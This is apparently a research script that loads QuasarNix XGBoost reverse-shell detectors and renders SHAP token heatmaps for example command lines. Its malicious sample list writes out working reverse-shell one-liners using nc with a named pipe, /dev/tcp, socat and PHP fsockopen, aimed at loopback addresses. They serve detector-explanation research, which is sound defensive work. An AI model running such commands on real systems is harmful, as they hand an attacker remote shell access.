#!/usr/bin/env python3
import argparse
import csv
import json
import textwrap
import time
import urllib.request
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import matplotlib

matplotlib.use("Agg")
import matplotlib.pyplot as plt
import numpy as np
from matplotlib import colors as mcolors
from nltk.tokenize import wordpunct_tokenize
from scipy import sparse

try:
    import shap  # type: ignore
except Exception:
    shap = None

try:
    import xgboost as xgb  # type: ignore
except Exception:
    xgb = None


ROOT = Path(__file__).resolve().parent.parent
HF_BASE_URL = "https://huggingface.co/dtrizna/QuasarNix/resolve/main"

MODEL_ARTIFACTS = {
    "orig": {
        "model": "quasarnix_model_data_train_xgb_orig.xgboost",
        "vocab": "quasarnix_tokenizer_data_train_onehot_orig.json",
        "title": "Regularly trained XGBoost",
    },
    "adv": {
        "model": "quasarnix_model_data_train_xgb_adv.xgboost",
        "vocab": "quasarnix_tokenizer_data_train_onehot_adv.json",
        "title": "Adversarially trained XGBoost",
    },
}

REVERSE_SHELL_COMMANDS = [
    # {
    #     "name": "netcat_auditd",
    #     "label": "Netcat auditd example",
    #     "source": "QuasarNix paper, motivating auditd example",
    #     "command": "netcat -c sh -u 1.2.3.4 53",
    # },
    {
        "name": "mkfifo_nc_pipe",
        "label": "Named pipe with nc",
        "source": "QuasarNix paper, functionally equivalent reverse shells",
        "command": "mkfifo /tmp/a;cat /tmp/a|sh -i|nc 127.0.0.1 53>/tmp/a",
    },
    {
        "name": "dev_tcp_shell",
        "label": "/dev/tcp shell",
        "source": "QuasarNix paper, Table 1 functional variant",
        "command": "sh -i >& /dev/tcp/127.0.0.1/53 0>&1",
    },
    {
        "name": "socat_exec_shell",
        "label": "Socat exec shell",
        "source": "QuasarNix paper, Table 1 functional variant",
        "command": "socat tcp-connect:127.0.0.1:443 exec:/bin/sh",
    },
    {
        "name": "php_fsockopen",
        "label": "PHP fsockopen shell",
        "source": "QuasarNix paper, Table 1 functional variant",
        "command": """php -r '$a=fsockopen("127.0.0.1",23);exec("sh");'""",
    },
]

LEGITIMATE_COMMANDS = [
    {
        "name": "read_cgroup_memory",
        "label": "Read cgroup memory stats",
        "source": "Benign administrative command-line example",
        "command": "cat /sys/fs/cgroup/memory/memory.stat",
    },
    {
        "name": "inspect_process_exe",
        "label": "Inspect process executable",
        "source": "Benign administrative command-line example",
        "command": "readlink /proc/self/exe",
    },
    {
        "name": "list_python_processes",
        "label": "List Python processes",
        "source": "Benign administrative command-line example",
        "command": "ps aux | grep python",
    },
    {
        "name": "disk_usage_tmp",
        "label": "Check /tmp disk usage",
        "source": "Benign administrative command-line example",
        "command": "du -sh /tmp",
    },
    # {
    #     "name": "find_recent_logs",
    #     "label": "Find recent log files",
    #     "source": "Benign administrative command-line example",
    #     "command": "find /var/log -type f -mtime -1",
    # },
]

EXAMPLE_SETS = {
    "reverse_shell": REVERSE_SHELL_COMMANDS,
    "legitimate": LEGITIMATE_COMMANDS,
    "all": REVERSE_SHELL_COMMANDS + LEGITIMATE_COMMANDS,
}


@dataclass(frozen=True)
class TokenAttribution:
    token: str
    feature_index: int | None
    shap_value: float
    raw_feature_shap: float
    count_in_command: int
    in_vocab: bool


@dataclass(frozen=True)
class CommandAttribution:
    name: str
    label: str
    source: str
    command: str
    probability: float
    base_value: float
    shap_sum: float
    tokens: list[TokenAttribution]


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Generate blue/red token-level SHAP heatmaps for QuasarNix "
            "paper command-line examples."
        )
    )
    parser.add_argument(
        "--model-kind",
        choices=sorted(MODEL_ARTIFACTS),
        default="adv",
        help="Released XGBoost model/tokenizer pair to explain.",
    )
    parser.add_argument(
        "--example-set",
        choices=sorted(EXAMPLE_SETS),
        default="reverse_shell",
        help="Command-line examples to explain.",
    )
    parser.add_argument(
        "--artifacts-dir",
        type=Path,
        default=ROOT / "experiments" / "hf_quasarnix_artifacts",
        help="Directory for cached Hugging Face model and tokenizer artifacts.",
    )
    parser.add_argument(
        "--out-dir",
        type=Path,
        default=None,
        help="Output directory. Defaults to experiments/logs_xai_token_heatmap_<model>_<examples>_<timestamp>.",
    )
    parser.add_argument(
        "--dpi",
        type=int,
        default=300,
        help="Figure resolution.",
    )
    return parser.parse_args()


def require_dependencies() -> None:
    missing = []
    if shap is None:
        missing.append("shap")
    if xgb is None:
        missing.append("xgboost")
    if missing:
        joined = ", ".join(missing)
        raise RuntimeError(f"Missing required dependencies: {joined}")


def download_if_missing(filename: str, artifacts_dir: Path) -> Path:
    artifacts_dir.mkdir(parents=True, exist_ok=True)
    output_path = artifacts_dir / filename
    if output_path.exists():
        return output_path

    url = f"{HF_BASE_URL}/{filename}"
    print(f"[*] Downloading {filename}")
    urllib.request.urlretrieve(url, output_path)
    return output_path


def load_vocab(path: Path) -> dict[str, int]:
    with path.open("r", encoding="utf-8") as f:
        raw_vocab = json.load(f)
    return {str(token): int(index) for token, index in raw_vocab.items()}


def load_model(path: Path) -> Any:
    model = xgb.XGBClassifier()
    model.load_model(str(path))
    return model


def resolve_feature_count(model: Any, vocab: dict[str, int]) -> int:
    try:
        return int(model.get_booster().num_features())
    except Exception:
        return max(vocab.values()) + 1


def encode_commands(
    commands: list[str], vocab: dict[str, int], feature_count: int
) -> Any:
    rows = []
    cols = []
    values = []
    for row_index, command in enumerate(commands):
        seen_indices = set()
        for token in wordpunct_tokenize(command.lower()):
            feature_index = vocab.get(token)
            if (
                feature_index is not None
                and feature_index < feature_count
                and feature_index not in seen_indices
            ):
                rows.append(row_index)
                cols.append(feature_index)
                values.append(1.0)
                seen_indices.add(feature_index)
    return sparse.csr_matrix(
        (values, (rows, cols)),
        shape=(len(commands), feature_count),
        dtype=np.float32,
    )


def resolve_shap_values(shap_values: Any) -> np.ndarray:
    if isinstance(shap_values, list):
        if len(shap_values) == 2 and shap_values[1] is not None:
            return np.asarray(shap_values[1])
        return np.asarray(shap_values[0])
    shap_array = np.asarray(shap_values)
    if shap_array.ndim == 3 and shap_array.shape[-1] == 2:
        return shap_array[:, :, 1]
    return shap_array


def resolve_base_value(explainer: Any) -> float:
    expected_value = explainer.expected_value
    if isinstance(expected_value, list):
        return float(
            expected_value[1] if len(expected_value) == 2 else expected_value[0]
        )
    expected_array = np.asarray(expected_value)
    if expected_array.ndim > 0:
        return float(expected_array.ravel()[-1])
    return float(expected_array)


def compute_shap(model: Any, encoded: np.ndarray) -> tuple[np.ndarray, float]:
    explainer = shap.TreeExplainer(model)
    shap_values = resolve_shap_values(explainer.shap_values(encoded))
    return shap_values, resolve_base_value(explainer)


def score_commands(model: Any, encoded: np.ndarray) -> np.ndarray:
    if hasattr(model, "predict_proba"):
        return np.asarray(model.predict_proba(encoded))[:, 1]
    margin = model.predict(encoded)
    return 1.0 / (1.0 + np.exp(-margin))


def attribute_command(
    example: dict[str, str],
    shap_row: np.ndarray,
    probability: float,
    base_value: float,
    vocab: dict[str, int],
) -> CommandAttribution:
    tokens = wordpunct_tokenize(example["command"].lower())
    token_counts = {token: tokens.count(token) for token in set(tokens)}

    attributions = []
    for token in tokens:
        feature_index = vocab.get(token)
        if feature_index is None or feature_index >= len(shap_row):
            attributions.append(
                TokenAttribution(
                    token=token,
                    feature_index=None,
                    shap_value=0.0,
                    raw_feature_shap=0.0,
                    count_in_command=token_counts[token],
                    in_vocab=False,
                )
            )
            continue

        raw_feature_shap = float(shap_row[feature_index])
        attributions.append(
            TokenAttribution(
                token=token,
                feature_index=feature_index,
                shap_value=raw_feature_shap / token_counts[token],
                raw_feature_shap=raw_feature_shap,
                count_in_command=token_counts[token],
                in_vocab=True,
            )
        )

    return CommandAttribution(
        name=example["name"],
        label=example["label"],
        source=example["source"],
        command=example["command"],
        probability=float(probability),
        base_value=base_value,
        shap_sum=float(np.sum(shap_row)),
        tokens=attributions,
    )


def resolve_color_limit(attributions: list[CommandAttribution]) -> float:
    values = [
        abs(item.shap_value)
        for attribution in attributions
        for item in attribution.tokens
        if abs(item.shap_value) > 1e-12
    ]
    if not values:
        return 1.0
    return float(np.percentile(values, 85))


def shap_to_color(value: float, color_limit: float) -> str:
    if color_limit <= 0 or abs(value) < 1e-12:
        return "#eeeeee"
    normalized = max(-1.0, min(1.0, value / color_limit))
    cmap = plt.get_cmap("RdBu_r")
    return mcolors.to_hex(cmap((normalized + 1.0) / 2.0))


def text_color(background: str) -> str:
    red, green, blue = mcolors.to_rgb(background)
    luminance = 0.2126 * red + 0.7152 * green + 0.0722 * blue
    return "black" if luminance > 0.58 else "white"


def wrap_tokens(
    tokens: list[TokenAttribution], max_chars: int = 120
) -> list[list[TokenAttribution]]:
    rows: list[list[TokenAttribution]] = []
    current_row: list[TokenAttribution] = []
    current_len = 0
    for token in tokens:
        token_len = len(token.token) + 1
        if current_row and current_len + token_len > max_chars:
            rows.append(current_row)
            current_row = []
            current_len = 0
        current_row.append(token)
        current_len += token_len
    if current_row:
        rows.append(current_row)
    return rows


def token_label(item: TokenAttribution) -> str:
    if item.in_vocab:
        return item.token
    return f"{item.token}*"


def row_width(row: list[TokenAttribution], char_width: float, gap: float) -> float:
    return sum(char_width * len(token_label(item)) + gap for item in row)


def example_section(attribution: CommandAttribution) -> str:
    reverse_shell_names = {example["name"] for example in REVERSE_SHELL_COMMANDS}
    if attribution.name in reverse_shell_names:
        return "Malicious examples"
    return "Legitimate examples"


def combined_plot_rows(
    attributions: list[CommandAttribution],
) -> tuple[list[CommandAttribution | str], list[float]]:
    sections = [example_section(attribution) for attribution in attributions]
    if len(set(sections)) == 1:
        return list(attributions), [1.0] * len(attributions)

    rows: list[CommandAttribution | str] = []
    heights: list[float] = []
    previous_section = None
    for attribution, section in zip(attributions, sections):
        if section != previous_section:
            rows.append(section)
            heights.append(0.32)
            previous_section = section
        rows.append(attribution)
        heights.append(1.0)
    return rows, heights


def add_shap_legend(
    fig: plt.Figure, ax: Any, color_limit: float, cax: Any | None = None
) -> None:
    norm = mcolors.Normalize(vmin=-color_limit, vmax=color_limit)
    mappable = plt.cm.ScalarMappable(norm=norm, cmap=plt.get_cmap("RdBu_r"))
    mappable.set_array([])
    if cax is None:
        colorbar = fig.colorbar(
            mappable,
            ax=ax,
            orientation="horizontal",
            fraction=0.08,
            pad=0.18,
            aspect=45,
        )
    else:
        colorbar = fig.colorbar(mappable, cax=cax, orientation="horizontal")
    colorbar.set_label(
        "Token SHAP value (blue: legitimate evidence, red: malicious evidence)",
        fontsize=9,
    )
    colorbar.ax.tick_params(labelsize=8)


def draw_command_heatmap(
    attribution: CommandAttribution,
    output_path: Path,
    title_prefix: str,
    color_limit: float,
    dpi: int,
) -> None:
    rows = wrap_tokens(attribution.tokens)
    figure_height = 1.9 + 0.36 * len(rows)
    fig, ax = plt.subplots(figsize=(12, figure_height))
    ax.set_axis_off()

    title = (
        f"{title_prefix}: {attribution.label}\n"
        f"P(malicious)={attribution.probability:.3f}; "
        "red = malicious evidence, blue = legitimate evidence"
    )
    ax.set_title(title, loc="center", fontsize=13, fontweight="bold", pad=12)

    y = 0.83
    char_width = 0.0085
    gap = 0.007
    for row in rows:
        x = max(0.01, (1.0 - row_width(row, char_width, gap)) / 2.0)
        for item in row:
            color = shap_to_color(item.shap_value, color_limit)
            label = token_label(item)
            ax.text(
                x,
                y,
                label,
                transform=ax.transAxes,
                fontsize=11,
                family="monospace",
                color=text_color(color),
                bbox={
                    "boxstyle": "square,pad=0.08",
                    "facecolor": color,
                    "edgecolor": "#555555",
                    "linewidth": 0.12,
                },
            )
            x += char_width * len(label) + gap
        y -= 0.16

    source = textwrap.fill(f"Source: {attribution.source}", width=100)
    ax.text(
        0.5,
        0.11,
        source,
        transform=ax.transAxes,
        fontsize=9,
        color="#555555",
        ha="center",
    )

    add_shap_legend(fig, ax, color_limit)
    fig.tight_layout()
    fig.savefig(output_path.with_suffix(".png"), dpi=dpi, bbox_inches="tight")
    fig.savefig(output_path.with_suffix(".pdf"), dpi=dpi, bbox_inches="tight")
    plt.close(fig)


def draw_combined_heatmap(
    attributions: list[CommandAttribution],
    output_path: Path,
    title_prefix: str,
    color_limit: float,
    dpi: int,
) -> None:
    plot_rows, height_ratios = combined_plot_rows(attributions)
    figure_height = max(5.2, 0.72 * len(attributions) + 0.24 * len(plot_rows) + 1.6)
    fig, axes = plt.subplots(
        len(plot_rows),
        1,
        figsize=(12, figure_height),
        squeeze=False,
        gridspec_kw={"height_ratios": height_ratios},
    )
    fig.suptitle(
        f"{title_prefix}: command-line token SHAP attribution",
        x=0.5,
        ha="center",
        fontsize=15,
        fontweight="bold",
    )

    fig.subplots_adjust(left=0.01, right=0.99, top=0.9, bottom=0.2, hspace=0.18)

    for ax, row in zip(axes[:, 0], plot_rows):
        ax.set_axis_off()
        if isinstance(row, str):
            ax.text(
                0.5,
                0.5,
                row,
                transform=ax.transAxes,
                ha="center",
                va="center",
                fontsize=12,
                fontweight="bold",
            )
            continue

        attribution = row
        ax.text(
            0.5,
            0.72,
            f"{attribution.label}  |  P(malicious)={attribution.probability:.3f}",
            transform=ax.transAxes,
            ha="center",
            va="center",
            fontsize=10.5,
        )
        rows = wrap_tokens(attribution.tokens, max_chars=132)
        y = 0.24
        char_width = 0.0078
        gap = 0.006
        for row in rows:
            x = max(0.01, (1.0 - row_width(row, char_width, gap)) / 2.0)
            for item in row:
                color = shap_to_color(item.shap_value, color_limit)
                label = token_label(item)
                ax.text(
                    x,
                    y,
                    label,
                    transform=ax.transAxes,
                    fontsize=10,
                    family="monospace",
                    color=text_color(color),
                    bbox={
                        "boxstyle": "square,pad=0.07",
                        "facecolor": color,
                        "edgecolor": "#555555",
                        "linewidth": 0.1,
                    },
                )
                x += char_width * len(label) + gap
            y -= 0.24

    colorbar_axis = fig.add_axes([0.35, 0.08, 0.3, 0.03])
    add_shap_legend(fig, axes[:, 0].tolist(), color_limit, cax=colorbar_axis)
    fig.text(
        0.5,
        0.01,
        "Positive SHAP values push the model towards maliciousness; "
        "negative values push it towards legitimacy. Asterisk marks OOV tokens.",
        fontsize=10,
        color="#555555",
        ha="center",
    )
    fig.savefig(output_path.with_suffix(".png"), dpi=dpi, bbox_inches="tight")
    fig.savefig(output_path.with_suffix(".pdf"), dpi=dpi, bbox_inches="tight")
    plt.close(fig)


def save_token_csv(attributions: list[CommandAttribution], output_path: Path) -> None:
    with output_path.open("w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(
            f,
            fieldnames=[
                "command_name",
                "command_label",
                "probability_malicious",
                "token",
                "feature_index",
                "token_shap",
                "raw_feature_shap",
                "count_in_command",
                "in_vocab",
            ],
        )
        writer.writeheader()
        for attribution in attributions:
            for item in attribution.tokens:
                writer.writerow(
                    {
                        "command_name": attribution.name,
                        "command_label": attribution.label,
                        "probability_malicious": f"{attribution.probability:.8f}",
                        "token": item.token,
                        "feature_index": item.feature_index,
                        "token_shap": f"{item.shap_value:.8f}",
                        "raw_feature_shap": f"{item.raw_feature_shap:.8f}",
                        "count_in_command": item.count_in_command,
                        "in_vocab": item.in_vocab,
                    }
                )


def main() -> None:
    args = parse_args()
    require_dependencies()

    artifact = MODEL_ARTIFACTS[args.model_kind]
    examples = EXAMPLE_SETS[args.example_set]
    out_dir = args.out_dir
    if out_dir is None:
        out_dir = (
            ROOT
            / "experiments"
            / f"logs_xai_token_heatmap_{args.model_kind}_{args.example_set}_{int(time.time())}"
        )
    out_dir.mkdir(parents=True, exist_ok=True)

    model_path = download_if_missing(artifact["model"], args.artifacts_dir)
    vocab_path = download_if_missing(artifact["vocab"], args.artifacts_dir)

    print(f"[*] Loading model: {model_path}")
    model = load_model(model_path)
    vocab = load_vocab(vocab_path)
    feature_count = resolve_feature_count(model, vocab)

    commands = [example["command"] for example in examples]
    encoded = encode_commands(commands, vocab, feature_count)
    probabilities = score_commands(model, encoded)
    shap_values, base_value = compute_shap(model, encoded)

    attributions = [
        attribute_command(example, shap_row, probability, base_value, vocab)
        for example, shap_row, probability in zip(examples, shap_values, probabilities)
    ]
    color_limit = resolve_color_limit(attributions)

    title_prefix = artifact["title"]
    for attribution in attributions:
        draw_command_heatmap(
            attribution=attribution,
            output_path=out_dir / attribution.name,
            title_prefix=title_prefix,
            color_limit=color_limit,
            dpi=args.dpi,
        )

    draw_combined_heatmap(
        attributions=attributions,
        output_path=out_dir / "combined_quasarnix_token_shap",
        title_prefix=title_prefix,
        color_limit=color_limit,
        dpi=args.dpi,
    )
    save_token_csv(attributions, out_dir / "token_attributions.csv")

    with (out_dir / "commands.json").open("w", encoding="utf-8") as f:
        json.dump(examples, f, indent=2)

    print(f"[+] Wrote token attribution figures to: {out_dir}")
    print(f"[+] Combined panel: {out_dir / 'combined_quasarnix_token_shap.png'}")
    print(f"[+] Token values: {out_dir / 'token_attributions.csv'}")


if __name__ == "__main__":
    main()
